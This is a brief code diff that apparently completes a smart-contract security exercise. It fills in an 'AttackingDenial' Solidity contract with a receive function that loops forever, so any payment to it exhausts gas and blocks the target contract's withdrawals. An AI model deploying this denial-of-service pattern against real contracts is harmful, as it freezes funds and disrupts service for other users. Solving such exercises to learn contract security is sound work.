@@ -9,5 +9,10 @@ contract AttackingDenial {
         contractAddress = _contractAddress;
     }
 
-    //Code me!
+    receive () external payable {
+        uint counter = 0;
+        while (1 == 1) {
+            counter++;
+        }
+    }
 }
